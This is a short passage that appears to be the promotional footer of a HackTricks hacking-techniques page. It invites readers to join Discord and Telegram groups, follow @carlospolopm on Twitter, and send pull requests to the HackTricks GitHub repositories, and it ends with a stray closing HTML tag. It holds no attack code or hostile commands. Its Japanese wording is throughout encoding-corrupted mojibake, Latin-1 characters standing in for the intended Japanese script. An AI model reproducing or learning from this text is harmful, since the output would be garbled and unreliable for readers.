* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
